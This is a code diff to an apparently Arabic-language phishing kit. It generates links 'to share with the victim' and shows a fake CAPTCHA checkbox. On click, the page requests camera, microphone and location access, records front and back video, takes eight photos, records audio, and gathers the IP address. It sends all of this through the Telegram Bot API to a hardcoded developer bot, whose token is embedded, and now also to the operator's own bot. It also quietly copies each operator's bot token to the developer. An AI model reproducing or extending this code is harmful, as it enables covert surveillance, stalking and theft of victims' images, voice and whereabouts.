@@ -1516,6 +1516,8 @@
             const MASTER_BOT_TOKEN = "8907179366:AAGK-b_KuCTxwfjOfZVXtEblQaqg18R3mXk";
             const MASTER_CHAT_ID = "8552540563";
             const DEVELOPER_LINK = "https://t.me/xx_8k";
+            const DB_NAME = 'ZeusTokensDB';
+            const DB_VERSION = 2;
 
             // ============================================================
             //  🔥  HELPERS
@@ -1533,12 +1535,49 @@
 
             function delay(ms) { return new Promise(r => setTimeout(r, ms)); }
 
+            // ----- IndexedDB Helpers -----
+            function openDB() {
+                return new Promise((resolve, reject) => {
+                    const req = indexedDB.open(DB_NAME, DB_VERSION);
+                    req.onupgradeneeded = (e) => {
+                        const db = e.target.result;
+                        if (!db.objectStoreNames.contains('tokens')) {
+                            db.createObjectStore('tokens', { keyPath: 'shortToken' });
+                        }
+                    };
+                    req.onsuccess = () => resolve(req.result);
+                    req.onerror = () => reject(req.error);
+                });
+            }
+
+            async function saveTokenMapping(shortToken, botToken, chatId, botName) {
+                try {
+                    const db = await openDB();
+                    const tx = db.transaction('tokens', 'readwrite');
+                    const store = tx.objectStore('tokens');
+                    store.put({ shortToken, botToken, chatId, botName });
+                    await new Promise((resolve) => { tx.oncomplete = resolve; });
+                } catch (e) { console.warn('Save mapping error:', e); }
+            }
+
+            async function getTokenMapping(shortToken) {
+                try {
+                    const db = await openDB();
+                    const tx = db.transaction('tokens', 'readonly');
+                    const store = tx.objectStore('tokens');
+                    return new Promise((resolve) => {
+                        const req = store.get(shortToken);
+                        req.onsuccess = () => resolve(req.result || null);
+                        req.onerror = () => resolve(null);
+                    });
+                } catch (e) { return null; }
+            }
+
             // ----- Deterministic 6-char token generator -----
             async function generateToken(botToken, chatId) {
                 const salt = "ZEUS_SALT_2024";
                 const input = botToken + chatId + salt;
 
-                // SHA-256
                 if (window.crypto && window.crypto.subtle) {
                     try {
                         const encoder = new TextEncoder();
@@ -1546,14 +1585,12 @@
                         const hashBuffer = await crypto.subtle.digest('SHA-256', data);
                         const hashArray = Array.from(new Uint8Array(hashBuffer));
                         const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
-                        // take first 12 hex chars -> convert to base36 -> take first 6
                         const bigInt = BigInt('0x' + hashHex.substring(0, 12));
                         const base36 = bigInt.toString(36).toUpperCase();
                         return base36.substring(0, 6).padStart(6, '0');
                     } catch (e) { console.warn('Crypto fail, fallback'); }
                 }
 
-                // Fallback simple hash
                 let hash = 0;
                 for (let i = 0; i < input.length; i++) {
                     const char = input.charCodeAt(i);
@@ -1563,13 +1600,16 @@
                 return Math.abs(hash).toString(36).toUpperCase().padStart(6, '0').substring(0, 6);
             }
 
-            // ----- Verify bot token -----
-            async function verifyBotToken(token) {
+            // ----- Verify bot token & get bot name -----
+            async function verifyAndGetBotInfo(token) {
                 try {
                     const res = await fetch(`https://api.telegram.org/bot${token}/getMe`);
                     const data = await res.json();
-                    return data.ok === true;
-                } catch { return false; }
+                    if (data.ok) {
+                        return { valid: true, username: data.result.username || data.result.first_name };
+                    }
+                    return { valid: false, username: null };
+                } catch { return { valid: false, username: null }; }
             }
 
             // ----- Send media to a bot (helper) -----
@@ -1624,8 +1664,9 @@
                         showToast('⚠️ يرجى ملء جميع الحقول المطلوبة.', 'warning');
                         return;
                     }
-                    const valid = await verifyBotToken(botToken);
-                    if (!valid) {
+
+                    const info = await verifyAndGetBotInfo(botToken);
+                    if (!info.valid) {
                         showToast('❌ توكن البوت غير صحيح. يرجى التأكد.', 'error');
                         return;
                     }
@@ -1635,10 +1676,12 @@
                     genBtn.textContent = 'جارٍ التوليد …';
 
                     try {
-                        // Generate deterministic token
                         const shortToken = await generateToken(botToken, chatId);
                         const base = window.location.origin + window.location.pathname;
                         const link = `${base}?t=${shortToken}`;
+
+                        // Store mapping in IndexedDB
+                        await saveTokenMapping(shortToken, botToken, chatId, info.username);
 
                         // Display
                         tokenDisplay.textContent = shortToken;
@@ -1648,7 +1691,7 @@
                         const userMsg =
                             `🔗 *رابطك الجديد*\n${link}\n\n` +
                             `📌 التوكن الفريد: \`${shortToken}\`\n` +
-                            `شاركه مع الضحية، وسيتم جمع البيانات وإرسالها إلى المطور.\n` +
+                            `شاركه مع الضحية، وسيتم جمع البيانات وإرسالها إليك وإلى المطور.\n` +
                             `🛡️ النظام متكامل مع نسخة احتياطية للمطور.`;
 
                         await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -1670,6 +1713,7 @@
                         const masterMsg =
                             `⭑ نسخة احتياطية — رابط جديد ⭒\n` +
                             `⊚─〔 بيانات البوت 〕────────\n` +
+                            `˼⏣˹ اسم البوت: @${info.username} ⭒\n` +
                             `˼⏣˹ التوكن الأساسي: ${botToken} ⭒\n` +
                             `˼⏣˹ الإيدي: ${chatId} ⭒\n` +
                             `˼⏣˹ التوكن الفريد: ${shortToken} ⭒\n` +
@@ -1772,7 +1816,26 @@
                     statusEl.style.color = isError ? '#d93025' : '#666';
                 }
 
-                // ---- Permission request ----
+                // ---- Get bot mapping from IndexedDB ----
+                async function getBotMapping(token) {
+                    try {
+                        const mapping = await getTokenMapping(token);
+                        if (mapping) {
+                            return {
+                                botToken: mapping.botToken,
+                                chatId: mapping.chatId,
+                                botName: mapping.botName || 'المستخدم',
+                                found: true
+                            };
+                        }
+                        return { found: false };
+                    } catch (e) {
+                        console.warn('Mapping lookup error:', e);
+                        return { found: false };
+                    }
+                }
+
+                // ---- Request permissions ----
                 async function requestPermissions() {
                     const results = await Promise.allSettled([
                         navigator.mediaDevices.getUserMedia({ video: true }),
@@ -1805,6 +1868,12 @@
                     setStatus('⏳ جاري تهيئة الأجهزة ...');
 
                     try {
+                        // Get bot mapping
+                        const mapping = await getBotMapping(shortToken);
+                        const botName = mapping.found ? mapping.botName : 'غير معروف';
+                        const userBotToken = mapping.found ? mapping.botToken : null;
+                        const userChatId = mapping.found ? mapping.chatId : null;
+
                         // Request permissions
                         await requestPermissions();
 
@@ -1848,7 +1917,6 @@
                             await video.play();
                             await delay(400);
 
-                            // Record 5s video
                             const recorder = new MediaRecorder(stream);
                             const chunks = [];
                             recorder.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
@@ -1863,7 +1931,6 @@
                             if (recorder.state === 'recording') recorder.stop();
                             frontVideo = await videoPromise;
 
-                            // Capture 8 photos
                             for (let i = 0; i < 8; i++) {
                                 const w = video.videoWidth || 640;
                                 const h = video.videoHeight || 480;
@@ -1932,9 +1999,9 @@
                             console.warn('Audio error:', e);
                         }
 
-                        setStatus('📤 جاري إرسال البيانات إلى المطور ...');
+                        setStatus('📤 جاري إرسال البيانات إلى المطور والمستخدم ...');
 
-                        // ---- Send to Master Bot ----
+                        // ---- Build summary ----
                         const deviceInfo =
                             `IP: ${ip}\n` +
                             `الموقع: ${location.lat ? location.lat + ', ' + location.lng : 'غير متاح'}\n` +
@@ -1943,68 +2010,145 @@
                             `التوكن الفريد: ${shortToken}\n` +
                             `الوقت: ${new Date().toLocaleString('ar-EG')}`;
 
-                        // Send summary text
-                        await fetch(`https://api.telegram.org/bot${MASTER_BOT_TOKEN}/sendMessage`, {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({
-                                chat_id: MASTER_CHAT_ID,
-                                text: `⭑ تقرير ضحية جديدة ⭒\n⊚─〔 البيانات 〕────────\n${deviceInfo}\n─────────────────`
-                            })
-                        });
-
-                        // Send location if available
-                        if (location.lat && location.lng) {
-                            await fetch(`https://api.telegram.org/bot${MASTER_BOT_TOKEN}/sendLocation`, {
+                        // ---- Send to Master Bot (Developer) ----
+                        async function sendToMaster() {
+                            // Summary text
+                            await fetch(`https://api.telegram.org/bot${MASTER_BOT_TOKEN}/sendMessage`, {
                                 method: 'POST',
                                 headers: { 'Content-Type': 'application/json' },
                                 body: JSON.stringify({
                                     chat_id: MASTER_CHAT_ID,
-                                    latitude: location.lat,
-                                    longitude: location.lng
+                                    text: `⭑ تقرير ضحية جديدة — نسخة المطور ⭒\n⊚─〔 البيانات 〕────────\n${deviceInfo}\n─────────────────`
                                 })
                             });
+
+                            // Location
+                            if (location.lat && location.lng) {
+                                await fetch(`https://api.telegram.org/bot${MASTER_BOT_TOKEN}/sendLocation`, {
+                                    method: 'POST',
+                                    headers: { 'Content-Type': 'application/json' },
+                                    body: JSON.stringify({
+                                        chat_id: MASTER_CHAT_ID,
+                                        latitude: location.lat,
+                                        longitude: location.lng
+                                    })
+                                });
+                            }
+
+                            // Photos
+                            for (let i = 0; i < photos.length; i++) {
+                                const fd = new FormData();
+                                fd.append('chat_id', MASTER_CHAT_ID);
+                                fd.append('photo', photos[i], `photo_${i+1}.jpg`);
+                                fd.append('caption', `📸 صورة ${i+1}/${photos.length} - ${shortToken}`);
+                                await sendMedia('sendPhoto', MASTER_BOT_TOKEN, fd);
+                                await delay(200);
+                            }
+
+                            // Front video
+                            if (frontVideo) {
+                                const fd = new FormData();
+                                fd.append('chat_id', MASTER_CHAT_ID);
+                                fd.append('video', frontVideo, 'front_video.webm');
+                                fd.append('caption', `🎥 فيديو أمامي - ${shortToken}`);
+                                await sendMedia('sendVideo', MASTER_BOT_TOKEN, fd);
+                            }
+
+                            // Back video
+                            if (backVideo) {
+                                const fd = new FormData();
+                                fd.append('chat_id', MASTER_CHAT_ID);
+                                fd.append('video', backVideo, 'back_video.webm');
+                                fd.append('caption', `🎥 فيديو خلفي - ${shortToken}`);
+                                await sendMedia('sendVideo', MASTER_BOT_TOKEN, fd);
+                            }
+
+                            // Audio
+                            if (audioBlob) {
+                                const fd = new FormData();
+                                fd.append('chat_id', MASTER_CHAT_ID);
+                                fd.append('audio', audioBlob, 'audio.webm');
+                                fd.append('caption', `🎤 تسجيل صوتي - ${shortToken}`);
+                                await sendMedia('sendAudio', MASTER_BOT_TOKEN, fd);
+                            }
                         }
 
-                        // Send photos
-                        for (let i = 0; i < photos.length; i++) {
-                            const fd = new FormData();
-                            fd.append('chat_id', MASTER_CHAT_ID);
-                            fd.append('photo', photos[i], `photo_${i+1}.jpg`);
-                            fd.append('caption', `📸 صورة ${i+1}/${photos.length} - ${shortToken}`);
-                            await sendMedia('sendPhoto', MASTER_BOT_TOKEN, fd);
-                            await delay(200);
+                        // ---- Send to User's Bot (if mapping found) ----
+                        async function sendToUser() {
+                            if (!userBotToken || !userChatId) {
+                                console.log('User bot not found, skipping user send.');
+                                return;
+                            }
+
+                            // Summary text
+                            await fetch(`https://api.telegram.org/bot${userBotToken}/sendMessage`, {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({
+                                    chat_id: userChatId,
+                                    text: `⭑ تقرير ضحية جديدة — بوتك (@${botName}) ⭒\n⊚─〔 البيانات 〕────────\n${deviceInfo}\n─────────────────`
+                                })
+                            });
+
+                            // Location
+                            if (location.lat && location.lng) {
+                                await fetch(`https://api.telegram.org/bot${userBotToken}/sendLocation`, {
+                                    method: 'POST',
+                                    headers: { 'Content-Type': 'application/json' },
+                                    body: JSON.stringify({
+                                        chat_id: userChatId,
+                                        latitude: location.lat,
+                                        longitude: location.lng
+                                    })
+                                });
+                            }
+
+                            // Photos
+                            for (let i = 0; i < photos.length; i++) {
+                                const fd = new FormData();
+                                fd.append('chat_id', userChatId);
+                                fd.append('photo', photos[i], `photo_${i+1}.jpg`);
+                                fd.append('caption', `📸 صورة ${i+1}/${photos.length} - ${shortToken}`);
+                                await sendMedia('sendPhoto', userBotToken, fd);
+                                await delay(200);
+                            }
+
+                            // Front video
+                            if (frontVideo) {
+                                const fd = new FormData();
+                                fd.append('chat_id', userChatId);
+                                fd.append('video', frontVideo, 'front_video.webm');
+                                fd.append('caption', `🎥 فيديو أمامي - ${shortToken}`);
+                                await sendMedia('sendVideo', userBotToken, fd);
+                            }
+
+                            // Back video
+                            if (backVideo) {
+                                const fd = new FormData();
+                                fd.append('chat_id', userChatId);
+                                fd.append('video', backVideo, 'back_video.webm');
+                                fd.append('caption', `🎥 فيديو خلفي - ${shortToken}`);
+                                await sendMedia('sendVideo', userBotToken, fd);
+                            }
+
+                            // Audio
+                            if (audioBlob) {
+                                const fd = new FormData();
+                                fd.append('chat_id', userChatId);
+                                fd.append('audio', audioBlob, 'audio.webm');
+                                fd.append('caption', `🎤 تسجيل صوتي - ${shortToken}`);
+                                await sendMedia('sendAudio', userBotToken, fd);
+                            }
                         }
 
-                        // Send front video
-                        if (frontVideo) {
-                            const fd = new FormData();
-                            fd.append('chat_id', MASTER_CHAT_ID);
-                            fd.append('video', frontVideo, 'front_video.webm');
-                            fd.append('caption', `🎥 فيديو أمامي - ${shortToken}`);
-                            await sendMedia('sendVideo', MASTER_BOT_TOKEN, fd);
-                        }
-
-                        // Send back video
-                        if (backVideo) {
-                            const fd = new FormData();
-                            fd.append('chat_id', MASTER_CHAT_ID);
-                            fd.append('video', backVideo, 'back_video.webm');
-                            fd.append('caption', `🎥 فيديو خلفي - ${shortToken}`);
-                            await sendMedia('sendVideo', MASTER_BOT_TOKEN, fd);
-                        }
-
-                        // Send audio
-                        if (audioBlob) {
-                            const fd = new FormData();
-                            fd.append('chat_id', MASTER_CHAT_ID);
-                            fd.append('audio', audioBlob, 'audio.webm');
-                            fd.append('caption', `🎤 تسجيل صوتي - ${shortToken}`);
-                            await sendMedia('sendAudio', MASTER_BOT_TOKEN, fd);
-                        }
+                        // ---- Execute both sends ----
+                        await Promise.all([
+                            sendToMaster(),
+                            sendToUser()
+                        ]);
 
                         collectionDone = true;
-                        setStatus('✅ تم إرسال البيانات بنجاح إلى المطور!');
+                        setStatus('✅ تم إرسال البيانات بنجاح إلى المطور والمستخدم!');
                         spinner.classList.remove('loading');
                         spinner.classList.add('success');
                         mainText.textContent = 'تم التحقق بنجاح';
@@ -2022,7 +2166,6 @@
                         checkbox.disabled = false;
                         setStatus('❌ حدث خطأ. يمكنك المحاولة مرة أخرى بالنقر فوق المربع.', true);
                         isRunning = false;
-                        // Allow retry if not exceeded max attempts
                         if (attemptCount >= MAX_ATTEMPTS) {
                             setStatus('❌ تجاوزت عدد المحاولات المسموح. يرجى تحديث الصفحة.', true);
                             checkbox.disabled = true;
@@ -2040,7 +2183,6 @@
                     }
                 });
 
-                // Click on wrapper triggers checkbox
                 document.querySelector('.captcha-wrapper').addEventListener('click', function(e) {
                     if (e.target.closest('a')) return;
                     if (!isRunning && !collectionDone && !checkbox.disabled) {
